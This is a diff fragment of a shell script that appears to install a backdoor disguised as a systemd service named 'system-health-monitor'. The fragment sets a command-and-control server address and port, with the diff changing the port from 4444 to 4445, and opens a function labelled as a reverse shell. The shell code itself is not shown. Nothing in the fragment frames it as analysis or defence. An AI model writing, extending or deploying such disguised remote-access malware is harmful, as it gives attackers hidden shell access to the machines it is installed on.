@@ -19,7 +19,7 @@ log_error() { echo -e "${RED}[ERROR]${NC} $1"; }
 INSTALL_DIR="/usr/lib/systemd/system-monitor"
 SERVICE_NAME="system-health-monitor"
 C2_SERVER="192.168.1.167"
-C2_PORT="4444"
+C2_PORT="4445"
 
 # Reverse Shell Function
 start_reverse_shell() {
